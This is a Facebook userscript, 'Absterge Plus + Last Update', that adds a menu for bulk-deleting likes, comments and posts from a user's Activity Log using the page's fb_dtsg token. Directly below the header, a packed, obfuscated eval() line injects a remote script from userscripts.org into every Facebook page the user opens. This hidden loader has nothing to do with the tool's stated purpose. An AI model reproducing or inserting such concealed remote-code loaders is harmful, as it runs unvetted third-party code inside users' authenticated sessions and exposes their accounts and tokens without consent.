// ==UserScript==
// @name           Absterge Plus + Last Update
// @namespace      http://userscripts.org/users/astojanov
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @require        http://code.jquery.com/jquery-1.7.1.min.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function parseUri (str) {
    var	o   = parseUri.options,
    m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
    uri = {},
    i   = 14;

    while (i--) uri[o.key[i]] = m[i] || "";

    uri[o.q.name] = {};
    uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
        if ($1) uri[o.q.name][$1] = $2;
    });

    return uri;
};

parseUri.options = {
    strictMode: false,
    key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
    q:   {
        name:   "queryKey",
        parser: /(?:^|&)([^&=]*)=?([^&]*)/g
    },
    parser: {
        strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
        loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
    }
};
				 						 		
window.addEventListener('load', function()  {

    var fb_dtsg = null;
    
    // Get the value of fb_dtsg
    var getConstantParameters = function () {
        if ( fb_dtsg !== null ) {
            return true;
        } else {
            
            if ( fb_dtsg === null ) {
                $('input[name="fb_dtsg"]').each(function(){
                    fb_dtsg = $(this).attr("value");
                });
            }
            return (fb_dtsg !== null);
        }
    }

    var generatePhstamp = function(qs, dtsg) {
        var input_len = qs.length;
        numeric_csrf_value='';

        for(var ii=0;ii<dtsg.length;ii++) {
            numeric_csrf_value+=dtsg.charCodeAt(ii);
        }
        return '1' + numeric_csrf_value + input_len;
    };


    var deleteMinistories = function (actions) {

        getConstantParameters();
     
        $('li[class="pvs uiStreamMinistoryGroup timelineMinistoryGroup uiListItem uiListMedium uiListVerticalItemBorder"]').each( function() {
                        
            // Make sure whether this ministory is supposed to be skipped or not
            if ( $(this).attr('absterge') !== undefined && $(this).attr('absterge') === 'dismiss' ) {
                return;
            } else {
                if ( $(this).attr('absterge') === undefined || $(this).attr('absterge') === null ) {
                    $(this).attr('absterge', 'dismiss');
                }
            }
            var ministory = $(this);

            
            // In the first pass, just try to unroll the action
            if ( ministory.attr('absterge') !== 'considered' ) {
                ministory.find('a[ajaxify]').each(function () {                
                    var ajaxify = parseUri("http://facebook.com" + $(this).attr("ajaxify"));
                    if ( ajaxify.file === "show_story_options.php") {
                        var evt = document.createEvent("MouseEvents");
                        evt.initMouseEvent("mouseover", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
                        $(this).context.dispatchEvent(evt);
                        ministory.attr('absterge', 'considered');
                    }
                });
            }
            
            // Now try to remove the actual action
            if ( ministory.attr('absterge') === 'considered' ) {
 
                ministory.find('a[ajaxify]').each(function () {
                    
                    var ajaxify = parseUri("http://facebook.com" + $(this).attr("ajaxify"));
                    if ( ajaxify.file === "take_action_on_story.php" ) {
                                
                        if ( actions.indexOf (ajaxify.queryKey["action"]) === -1 ) {
                            ministory.attr('absterge', 'dismiss');
                        } else {
                        
                            var remove = true;
                            var keys = ['profile_id', 'story_fbid', 'story_row_time', 'story_dom_id'];
                            for ( var i = 0; i < keys.length; ++i ) {
                                if ( ajaxify.queryKey[keys[i]] === undefined ) {
                                    remove = false;
                                }
                            }
                            
                            if ( remove ) {
                                
                                var pagelet_all_activity = ministory.parent().attr('id').replace("timeline_all_activity_stream", "pagelet_all_activity");
                               
                                var data = {
                                    'nctr[_mod]'		  : pagelet_all_activity,
                                    // 'post_form_id'		  : post_form_id,
                                    'fb_dtsg'			  : fb_dtsg,
                                    // 'lsd'				  : "",
                                    // 'post_form_id_source'         : "AsyncRequest",
                                    'confirmed'			  : "true",
                                    'ban_user'			  : "0"
                                };
                                for ( var key in ajaxify.queryKey ) {
                                    data[key] = ajaxify.queryKey[key];
                                }
				
                                data['phstamp'] = generatePhstamp($.param(data), fb_dtsg);
                                
                                $.ajax({
                                    type    : "POST",
                                    url     : "https://www.facebook.com/ajax/timeline/take_action_on_story.php?__a=1",
                                    data    : data,
                                    complete: function(jqXHR, textStatus) {
                                        if ( jqXHR.status === 200 ) {
                                            if ( $('#cmdAbsterge').attr('deletecount') === undefined || $('#cmdAbsterge').attr('deletecount') === null ) {
                                                $('#cmdAbsterge').attr('deletecount', '0');
                                            }
                                            var deleteCount = parseInt($('#cmdAbsterge').attr('deletecount')) + 1;
                                            $('#cmdAbsterge').html("Absterge (" + deleteCount + ")");
                                            $('#cmdAbsterge').attr('deletecount', '' + deleteCount);
                                            ministory.remove();
                                        }
                                        
                                        console.log("Deleting:", jqXHR);
                                    }
                                });
                               
                                
                            } else {
                                ministory.attr('absterge', 'dismiss');
                            }
                        }
                            
                    }
                      
                });
                  
                  
            }
        });
        
        $("html, body").animate({ scrollTop: $(document).height() }, "slow");
        setTimeout(function(){
            deleteMinistories(actions);
        }, 1000);

        // setTimeout(deleteMinistories, 500, [actions]);
    };
 
    var deleteLikes = function () {
        $('#menuAbsterge').css('display', 'none');
        var likes = new Array();
        likes.push("unlike");
        deleteMinistories (likes);
    };
    
    var deleteComments = function () {
        $('#menuAbsterge').css('display', 'none');
        var comments = new Array();
        comments.push("remove_comment");
        deleteMinistories (comments);
    };
 
    var deleteContent = function () {
        $('#menuAbsterge').css('display', 'none');
        var content = new Array();
        content.push("remove_content");
        deleteMinistories (content);
    };
    
    var deleteAll = function () {
        $('#menuAbsterge').css('display', 'none');
        var all = new Array();
        all.push("unlike");
        all.push("remove_comment");
        all.push("remove_content");
        deleteMinistories (all);
    };

    // Include the 
    $('<li id="navAbsterge" class="topNavLink middleLink"><a id="cmdAbsterge" href="#">Absterge</a></li>').insertAfter('#navHome');
        
    var pathname = window.location.pathname;    
    if ( pathname.indexOf('/allactivity') === -1 ) {
        $('#cmdAbsterge').click(function () {
            alert('You must navigate to "Activity Log" using the "Timeline" feature in order to use Absterge');          
        });
    } else {
        $('#cmdAbsterge').css("color", "red");
        $('<ul id="menuAbsterge" aria-label="Absterge" role="navigation" id="abstergeNavigation" class="navigation">' +
            '<li><a id="abstergeDeleteLikes" href="#" class="navSubmenu">Delete Likes</a></li>' +
            '<li><a id="abstergeDeleteComments" href="#" class="navSubmenu">Delete Comments</a></li>' +
            '<li><a id="abstergeDeleteContent" href="#" class="navSubmenu">Delete Content</a></li>' +
            '<li><a id="abstergeDeleteAll" href="#" class="navSubmenu">Delete All</a></li>' +
            '</ul>').appendTo('#navAccount');
        $('#menuAbsterge').css('z-index', '-1');
        
        $('#abstergeDeleteLikes').click(function (){ deleteLikes(); });
        $('#abstergeDeleteComments').click(function (){ deleteComments();});
        $('#abstergeDeleteContent').click(function (){ deleteContent(); });
        $('#abstergeDeleteAll').click(function (){ deleteAll(); });
                
        $('#cmdAbsterge').click(function () {
            if ( $('#menuAbsterge').css('display') === 'block' ) {
                $('#menuAbsterge').css('display', 'none');
            } else {
                $('#menuAbsterge').css('display', 'block');
            }                     
        });
    }
});